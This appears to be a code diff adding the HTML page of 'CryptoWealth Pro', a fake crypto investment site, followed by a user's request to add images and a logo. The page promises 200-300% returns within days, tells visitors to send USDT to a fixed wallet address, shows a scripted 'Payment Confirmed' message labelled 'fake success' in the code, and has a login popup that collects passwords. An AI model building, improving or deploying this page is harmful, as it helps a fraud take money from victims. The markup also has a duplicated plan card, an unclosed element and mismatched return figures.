@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>CryptoWealth Pro - Grow Your Money 300%</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            background:#0f0f0f;
+            color:#fff;
+            font-family:'Rajdhani',sans-serif;
+            overflow-x:hidden;
+        }
+        .container{max-width:1300px;margin:0 auto;padding:0 20px;}
+
+        /* Header */
+        header{
+            position:fixed;top:0;left:0;right:0;
+            padding:20px 0;z-index:1000;
+            background:rgba(0,0,0,0.8);
+            backdrop-filter:blur(10px);
+        }
+        .nav{display:flex;justify-content:space-between;align-items:center;}
+        .logo{
+            font-family:'Orbitron',sans-serif;
+            font-size:2.5rem;
+            background:linear-gradient(45deg,#ffd700,#ffed4e);
+            -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent;
+        }
+        .login-btn{
+            background:#ffd700;color:#000;
+            padding:12px 35px;border-radius:50px;
+            font-weight:700;cursor:pointer;transition:0.3s;
+        }
+        .login-btn:hover{transform:scale(1.05);}
+        .menu-btn{display:none;font-size:1.8rem;cursor:pointer;}
+
+        /* Hero */
+        .hero{
+            height:100vh;display:flex;align-items:center;
+            background:linear-gradient(rgba(0,0,0,0.85),rgba(0,0,0,0.9)),
+            url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?ixlib=rb-4.0.3&auto=format&fit=crop&w=2232&q=80');
+            background-size:cover;background-position:center;
+            text-align:center;
+        }
+        .hero h1{
+            font-family:'Orbitron',sans-serif;font-size:5rem;
+            background:linear-gradient(45deg,#ffd700,#ffed4e);
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+        }
+        .hero p{font-size:1.5rem;margin:25px 0;opacity:0.9;}
+        .cta-btn{
+            background:#ffd700;color:#000;padding:20px 60px;
+            font-size:1.4rem;font-weight:700;border-radius:50px;
+            cursor:pointer;transition:0.4s;box-shadow:0 0 30px #ffd700;
+        }
+        .cta-btn:hover{transform:scale(1.1);}
+
+        /* Plans */
+        .plans{padding:120px 0;background:#111;text-align:center;}
+        .plans h2{
+            font-family:'Orbitron',sans-serif;font-size:3.5rem;margin-bottom:70px;
+            background:linear-gradient(45deg,#ffd700,#ffed4e);
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+        }
+        .cards{display:flex;justify-content:center;gap:50px;flex-wrap:wrap;}
+        .card{
+            background:#1a1a1a;width:340px;padding:40px 25px;
+            border-radius:25px;border:3px solid #333;
+            transition:0.5s;position:relative;overflow:hidden;
+        }
+        .card:hover{
+            border:3px solid #ffd700;transform:translateY(-20px);
+            box-shadow:0 0 50px rgba(255,215,0,0.4);
+        }
+        .card h3{font-family:'Orbitron',sans-serif;font-size:2rem;color:#ffd700;margin:15px 0;}
+        .invest{font-size:1.6rem;margin:15px 0;}
+        .return{font-size:2.4rem;font-weight:700;color:#ffd700;margin:20px 0;}
+        .invest-btn{
+            background:#ffd700;color:#000;width:85%;padding:18px;
+            margin:30px auto;border-radius:50px;font-weight:700;
+            font-size:1.3rem;cursor:pointer;transition:0.3s;
+        }
+        .invest-btn:hover{background:#ffed4e;transform:scale(1.05);}
+
+        /* Footer */
+        footer{background:#000;padding:60px 0;text-align:center;border-top:1px solid #333;}
+        .footer-logo{
+            font-family:'Orbitron',sans-serif;font-size:3rem;
+            background:linear-gradient(45deg,#ffd700,#ffed4e);
+            -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+        }
+
+        /* Popups */
+        .overlay{
+            position:fixed;top:0;left:0;width:100%;height:100%;
+            background:rgba(0,0,0,0.95);display:none;align-items:center;
+            justify-content:center;z-index:9999;
+        }
+        .popup{
+            background:#1a1a1a;width:90%;max-width:500px;padding:40px;
+            border-radius:20px;text-align:center;border:2px solid #ffd700;
+            animation:pop 0.4s ease;
+        }
+        @keyframes pop{from{transform:scale(0.5);}to{transform:scale(1);}}
+        .close-btn{
+            position:absolute;top:15px;right:20px;font-size:2rem;
+            color:#ffd700;cursor:pointer;
+        }
+        .wallet{
+            background:#333;padding:20px;border-radius:15px;margin:20px 0;
+            word-break:break-all;font-family:monospace;font-size:1.1rem;
+        }
+        .copy-btn{
+            background:#ffd700;color:#000;padding:12px 25px;
+            border:none;border-radius:50px;margin-top:15px;cursor:pointer;
+        }
+        .success{
+            background:#28a745;color:white;padding:20px;
+            border-radius:15px;margin:20px 0;display:none;
+        }
+
+        /* Mobile */
+        @media(max-width:768px){
+            .menu-btn{display:block;}
+            .nav-links{
+                position:fixed;top:70px;left:-100%;width:100%;height:100vh;
+                background:#000;padding:50px 0;transition:0.4s;
+            }
+            .nav-links.active{left:0;}
+            .nav-links a{display:block;padding:20px;font-size:1.8rem;}
+            .hero h1{font-size:3rem;}
+            .cards{flex-direction:column;align-items:center;}
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container nav">
+            <div class="logo">CryptoWealth<span style="color:#ffd700;">Pro</span></div>
+            <div class="login-btn" onclick="openLogin()">Login</div>
+            <div class="menu-btn">Menu</div>
+        </div>
+    </header>
+
+    <!-- Hero -->
+    <section class="hero">
+        <div class="container">
+            <h1>Grow Your Wealth With Crypto</h1>
+            <p>Invest securely and earn up to 300% returns.</p>
+            <div class="cta-btn" onclick="document.querySelector('#starter .invest-btn').click()">
+                Get Started
+            </div>
+        </div>
+    </section>
+
+    <!-- Plans -->
+    <section class="plans">
+        <div class="container">
+            <h2>Popular Plans</h2>
+            <div class="cards">
+                <div class="card" id="starter">
+                    <h3>Starter</h3>
+                    <div class="invest">Invest $500 - Get $1,500</div>
+                    <div class="return">200% Profit</div>
+                    <div>Duration: 7 Days</div>
+                    <div>Capital Returned</div>
+                    <div class="invest-btn" onclick="invest('Starter',500,1500,'200%')">Invest</div>
+                </div>
+                <div class="card" id="pro">
+                    <h3>Pro</h3>
+                    <div class="invest">Invest $1,000 - Get $3,000</div>
+                    <div class="return">200% Profit</div>
+                    <div>Duration: 7 Days</div>
+                    <div>Capital Returned</div>
+                    <div class="invest-btn" onclick="invest('Pro',1000,3000,'200%')">Invest</div>
+                </div>
+                <div class="card" id="elite">
+                    <h3>Elite</h3>
+                    <div class="invest">Invest $2,000 - Get $6,000</div>
+                    <div class="return">200% Profit</div>
+                    <div>Duration: 10 Days</div>
+                    <div>Capital Returned</div>
+                    <div class="invest-btn" onclick="invest('Elite',2000,6000,'200%')">Invest</div>
+                </div>
+                 <div class="card" id="elite">
+                    <h3>Elite</h3>
+                    <div class="invest">Invest $2,000 - Get $6,000</div>
+                    <div class="return">200% Profit</div>
+                    <div>Duration: 10 Days</div>
+                    <div>Capital Returned</div>
+                    <div class="invest-btn" onclick="invest('Elite',2000,6000,'200%')">Invest</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-logo">CryptoWealthPro</div>
+            <p>© 2025 All Rights Reserved. Made with Real Money Energy</p>
+        </div>
+    </footer>
+
+    <!-- Login Popup -->
+    <div class="overlay" id="loginOverlay">
+        <div class="popup">
+            <span class="close-btn" onclick="closePopup('loginOverlay')">&times;</span>
+            <h2>Login to Dashboard</h2>
+            <input type="text" placeholder="Username" style="width:100%;padding:15px;margin:15px 0;border-radius:10px;border:none;">
+            <input type="password" placeholder="Password" style="width:100%;padding:15px;margin:15px 0;border-radius:10px;border:none;">
+            <button class="cta-btn" style="width:100%;margin-top:20px;">Login Now</button>
+        </div>
+    </div>
+
+    <!-- Payment Popup -->
+    <div class="overlay" id="paymentOverlay">
+        <div class="popup">
+            <span class="close-btn" onclick="closePopup('paymentOverlay')">&times;</span>
+            <h2 id="planName">Starter Plan</h2>
+            <p>Send exactly <b id="amount">500</b> USDT (TRC20) to:</p>
+            <div class="wallet" id="walletAddr">bc1ppr9h6egrlnpuy343jkzpkadzs8jkrc7h6fw3lhd8udjr4tpks2vq5t8084</div>
+            <button class="copy-btn" onclick="copyWallet()">Copy Address</button>
+            <div class="success" id="successMsg">Payment Confirmed! Profit in 7 days!</div>
+            <p>After payment, click below:</p>
+            <button class="cta-btn" onclick="confirmPayment()" style="margin-top:15px;">I have paid</button>
+        </div>
+    </div>
+
+    <script>
+        // Mobile menu
+        document.querySelector('.menu-btn').addEventListener('click', () => {
+            document.querySelector('.nav-links')?.classList.toggle('active');
+        });
+
+        // Open login
+        function openLogin() {
+            document.getElementById('loginOverlay').style.display = 'flex';
+        }
+
+        // Invest function
+        function invest(plan, send, receive, profit) {
+            document.getElementById('planName').innerText = plan + ' Plan';
+            document.getElementById('amount').innerText = send;
+            document.getElementById('paymentOverlay').style.display = 'flex';
+        }
+
+        // Copy wallet
+        function copyWallet() {
+            navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
+            alert('Wallet address copied!');
+        }
+
+        // Confirm payment (fake success)
+        function confirmPayment() {
+            document.getElementById('successMsg').style.display = 'block';
+            setTimeout(() => {
+                closePopup('paymentOverlay');
+                alert('Congratulations! Your investment is active. Check dashboard in 7 days for profit!');
+            }, 2000);
+        }
+
+        // Close popup
+        function closePopup(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        // Close on outside click
+        document.querySelectorAll('.overlay').forEach(overlay => {
+            overlay.addEventListener('click', (e) => {
+                if (e.target === overlay) overlay.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>addthose images i posted to thes code leave my code dont rmove anything addd logo to it
